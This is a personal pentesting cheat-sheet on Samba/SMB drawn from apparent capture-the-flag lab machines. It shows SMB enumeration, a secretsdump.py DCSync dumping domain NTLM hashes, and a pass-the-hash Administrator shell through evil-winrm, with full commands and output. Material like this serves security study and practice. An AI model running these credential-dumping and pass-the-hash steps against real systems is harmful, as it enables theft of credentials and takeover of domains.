# Samba

## Script automated

```console
$ enum4linux <IP>
```

## Enumeration

```console
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.148.12

```

List shares:
```console
$ smbclient -L 10.10.148.12 -U milesdyson
Enter WORKGROUP\kantwood's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```console
$smbclient \\\\10.10.148.12\\milesdyson -U milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 11:05:47 2019
  ..                                  D        0  Wed Sep 18 05:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 11:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 11:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 11:05:14 2019
  notes                               D        0  Tue Sep 17 11:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 11:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 11:05:14 2019

                9204224 blocks of size 1024. 5831504 blocks availabl

```
|

## Domain Privilege Escalation /w secretsdump.py

You need creds for that:

```console 
$ sudo ./secretsdump.py -dc-ip 10.10.227.157 -target-ip 10.10.227.157 backup@spookysec.local                                              
[sudo] password for kantwood:                                                                                                                                                                 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                                                                                                      
                                                                                                                                                                                              
Password:                                                                                                                                                                                     
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                            
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                 
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                                               
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
```

NTLM hash: 0e0363213e37b94221497260b0bcb4fc

Use Evil-WinRM to connect with that hash:
```console
$ evil-winrm -i 10.10.227.157 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc                                                                                       
                                                                                                                                                                                              
Evil-WinRM shell v3.3                                                                                                                                                                         
                                                                                                                                                                                              
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                       
                                                                                                                                                                                              
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                                                               
Info: Establishing connection to remote endpoint                                               
                                                                                               
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

